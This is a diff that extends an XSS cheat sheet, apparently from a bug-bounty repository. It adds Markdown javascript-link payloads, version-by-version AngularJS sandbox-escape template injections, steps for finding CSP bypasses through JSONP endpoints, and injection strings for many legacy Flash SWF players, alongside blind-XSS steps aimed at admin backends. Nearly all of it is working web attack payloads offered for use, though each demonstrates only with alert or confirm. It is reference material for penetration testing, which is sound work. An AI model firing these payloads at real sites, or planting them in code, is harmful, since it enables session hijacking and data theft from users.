@@ -1,6 +1,6 @@
 # XSS Cheat Sheet (Basic)
 
-## **Introduction**
+## Introduction
 Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into websites. There is 3 types of XSS Attack:
 - Reflected XSS
 
@@ -12,7 +12,7 @@ Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious s
 
     A type of XSS that has payloads found in the DOM rather than within the HTML code.
 
-## **Payloads**
+## Payloads
 1. Basic payload
 ```html
 <script>alert(1)</script>
@@ -374,10 +374,10 @@ javascript://%250Aalert(1)
  ## Blind XSS
     
  Tools Used [XSS Hunter](https://xsshunter.com/features)
-    - Inject Blind XSS Payload to User-Agent Header
-    - Inject Blind XSS Payload to Referrer/Origin Header
-    - Try using another trick and tips above if there have some protection 
-    - Inject blind xss to the feature like (report, contant me, chat request,customer support,suggestion) where the admin or victim review it somewhere (backend)
+1. Inject Blind XSS Payload to User-Agent Header
+2. Inject Blind XSS Payload to Referrer/Origin Header
+3. Try using another trick and tips above if there have some protection 
+4. Inject blind xss to the feature like (report, contant me, chat request,customer support,suggestion) where the admin or victim review it somewhere (backend)
     
 ## Bypass WAF
 1. Cloudflare
@@ -439,5 +439,218 @@ Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
    - ?=”,?=!?+?,?=!?+?,?=?+{},?=?[?++],
 ?=?[?=?],?=++?+?,?=?[?+?],?[?+=?[?] +(?.?+?)[?]+?[?]+?+?+?[?]+?+?+?[?] +?][?](?[?]+?[?]+?[?]+?+?+”(?)”)()
    - 
+## Markdown XSS
+
+```md
+[a](javascript:confirm(1))
+```
+
+```md
+[a](javascript://www.google.com%0Aprompt(1))
+```
+
+```md
+[a](javascript://%0d%0aconfirm(1))
+```
+
+```md
+[a](javascript://%0d%0aconfirm(1);com)
+```
+
+```md
+[a](javascript:window.onerror=confirm;throw%201)
+```
+
+```md
+[a]: (javascript:prompt(1))
+```
+
+```md
+[a]:(javascript:alert(1))           //Add SOH Character
+```
+     
+## AngularJS Template Injection based XSS**
+
+*For manual verification on a live target, use `angular.version` in your browser console*
+
+**1.0.1 - 1.1.5** by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)
+
+```js
+{{constructor.constructor('alert(1)')()}}
+```
+
+**1.2.0 - 1.2.1** by [Jan Horn (Google)](https://twitter.com/tehjh)
+
+```js
+{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
+```
+
+**1.2.2 - 1.2.5** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)
+
+```js
+{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
+```
+
+**1.2.6 - 1.2.18** by [Jan Horn (Google)](https://twitter.com/tehjh)
+
+```js
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+```
+
+**1.2.19 - 1.2.23** by [Mathias Karlsson](https://twitter.com/avlidienbrunn)
+
+```js
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
+```
+
+**1.2.24 - 1.2.29** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)
+
+```js
+{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
+```
+
+**1.3.0** by [Gábor Molnár (Google)](https://twitter.com/molnar_g)
+
+```
+{{!ready && (ready = true) && (
+      !call
+      ? $$watchers[0].get(toString.constructor.prototype)
+      : (a = apply) &&
+        (apply = constructor) &&
+        (valueOf = call) &&
+        (''+''.toString(
+          'F = Function.prototype;' +
+          'F.apply = F.a;' +
+          'delete F.a;' +
+          'delete F.valueOf;' +
+          'alert(1);'
+        ))
+    );}}
+```
+
+**1.3.1 - 1.3.2** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)
+
+```js
+{{
+    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
+    'a'.constructor.prototype.charAt=''.valueOf; 
+    $eval('x=alert(1)//'); 
+}}
+```
+
+**1.3.3 - 1.3.18** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)
+
+```js
+{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 
+
+  'a'.constructor.prototype.charAt=[].join;
+  $eval('x=alert(1)//');  }}
+```
+
+**1.3.19** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)
+
+```js
+{{
+    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; 
+    $eval('x=alert(1)//'); 
+}}
+
+```
+
+**1.3.20** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)
+
+```js
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+```
+
+**1.4.0 - 1.4.9** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)
+
+```js
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+```
+
+**1.5.0 - 1.5.8** by [Ian Hickey](https://twitter.com/ianhickey1024)
+
+```js
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
+```
+
+**1.5.9 - 1.5.11** by [Jan Horn (Google)](https://twitter.com/tehjh)
+
+```js
+{{
+    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
+    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
+    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
+    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
+    B=C(b,c,b);$evalAsync("
+    astNode=pop();astNode.type='UnaryExpression';
+    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
+    astNode.argument={type:'Identifier',name:'foo'};
+    ");
+    m1=B($$asyncQueue.pop().expression,null,$root);
+    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
+    $eval('a(b.c)');[].push.apply=a;
+}}
+```
+
+**1.6.0+** (no [Expression Sandbox](http://angularjs.blogspot.co.uk/2016/09/angular-16-expression-sandbox-removal.html)) by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)
+
+```js
+{{constructor.constructor('alert(1)')()}}
+```
+     
+## Content Security Policy (CSP) bypass via JSONP endpoints**
+
+Grab the target's CSP:
+
+```
+curl -I http://example.com | grep 'Content-Security-Policy'
+```
+
+Either paste the CSP into https://csp-evaluator.withgoogle.com/ or just submit the target's address into the "Content Security Policy" field. The CSP Evaluator will notify you if one of the whitelisted domains has JSONP endpoints.
+
+![image](https://user-images.githubusercontent.com/18099289/32136707-a1c12510-bc12-11e7-8a80-8a22b3e94232.png)
+
+Now we can use a Google dork to find some JSONP endpoints on the domains listed above.
+
+```
+site:example.com inurl:callback
+```
+     
+## Flash SWF XSS
+
+   - ZeroClipboard: `ZeroClipboard.swf?id=\"))}catch(e){confirm(/XSS./.source);}//&width=500&height=500&.swf`
+   - plUpload Player: `plupload.flash.swf?%#target%g=alert&uid%g=XSS&`
+
+   - plUpload MoxiePlayer: `Moxie.swf?target%g=confirm&uid%g=XSS` (also works with `Moxie.cdn.swf` and other variants)
+
+   - FlashMediaElement: <code>flashmediaelement.swf?jsinitfunctio%gn=alert`1`</code>
+
+   - videoJS: `video-js.swf?readyFunction=confirm` and `video-js.swf?readyFunction=alert%28document.domain%2b'%20XSS'%29`
+
+   - YUI "io.swf": `io.swf?yid=\"));}catch(e){alert(document.domain);}//`
+
+   - YUI "uploader.swf": `uploader.swf?allowedDomain=\%22}%29%29%29}catch%28e%29{alert%28document.domain%29;}//<`
+
+   - Open Flash Chart: `open-flash-chart.swf?get-data=(function(){alert(1)})()`
+
+   - AutoDemo: `control.swf?onend=javascript:alert(1)//`
+
+   - Adobe FLV Progressive: `/main.swf?baseurl=asfunction:getURL,javascript:alert(1)//` and `/FLVPlayer_Progressive.swf?skinName=asfunction:getURL,javascript:alert(1)//`
+
+   - Banner.swf (generic): `banner.swf?clickTAG=javascript:alert(document.domain);//`
+
+   - JWPlayer (legacy): `player.swf?playerready=alert(document.domain)` and `/player.swf?tracecall=alert(document.domain)`
+
+   - SWFUpload 2.2.0.1: `swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!confirm(1);//`
+
+   - Uploadify (legacy): `uploadify.swf?movieName=%22])}catch(e){if(!window.x){window.x=1;confirm(%27XSS%27)}}//&.swf`
+
+   - FlowPlayer 3.2.7: `flowplayer-3.2.7.swf?config={"clip":{"url":"http://edge.flowplayer.org/bauhaus.mp4","linkUrl":"JavaScriPt:confirm(document.domain)"}}&.swf`
+
+_Note: Useful reference on constructing Flash-based XSS payloads available at [MWR Labs](https://labs.mwrinfosecurity.com/blog/popping-alert1-in-flash/)._
+
+     
 ## Reference:
    - https://github.com/Auxirie/AllAboutBugBounty/blob/master/Cross%20Site%20Scripting.md
